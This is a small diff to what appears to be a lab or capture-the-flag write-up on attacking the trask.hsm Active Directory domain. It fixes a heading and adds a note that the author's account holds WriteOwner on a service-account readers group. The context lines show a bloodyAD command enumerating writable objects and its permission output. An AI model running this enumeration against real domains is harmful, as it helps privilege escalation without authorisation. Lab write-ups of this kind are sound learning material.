@@ -857,7 +857,7 @@ SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\sentinel-5Tain
 
 This works, i wonder if these accounts have any interesting permissions
 
-# Enumerating the cre
+# Enumerating the created account
 
 ```python
 bloodyAD --host dc01.trask.hsm -d trask.hsm -k get writable                 
@@ -881,3 +881,6 @@ permission: CREATE_CHILD
 distinguishedName: DC=_msdcs.trask.hsm,CN=MicrosoftDNS,DC=ForestDnsZones,DC=trask,DC=hsm
 permission: CREATE_CHILD
 ```
+
+Looks like i have WriteOwner on the `CN=Sentinel Service Account Readers,OU=Sentinels,DC=trask,DC=hsm`
+
